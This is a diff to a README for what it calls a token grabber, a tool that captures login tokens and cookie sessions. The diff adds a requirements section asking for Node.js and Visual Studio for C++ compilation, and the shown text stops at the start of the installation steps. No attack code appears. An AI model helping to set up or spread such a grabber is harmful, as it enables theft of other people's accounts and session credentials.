@@ -28,6 +28,11 @@ Token grabbers work by intercepting and capturing tokens as they are transmitted
 # important 
 - **50** damn stars to this repository and add cookie session ⭐
 
+# Requirements
+- Downloads NodeJS Version [LTS](https://nodejs.org/en)
+- Download [Visual Studio Installer](https://visualstudio.microsoft.com/es/downloads) For c++ compilation
+*I emphasize that it is very important that you have this installed, to avoid errors*
+
 ## Installation
 - Follow these steps so you can have it
 ```bash
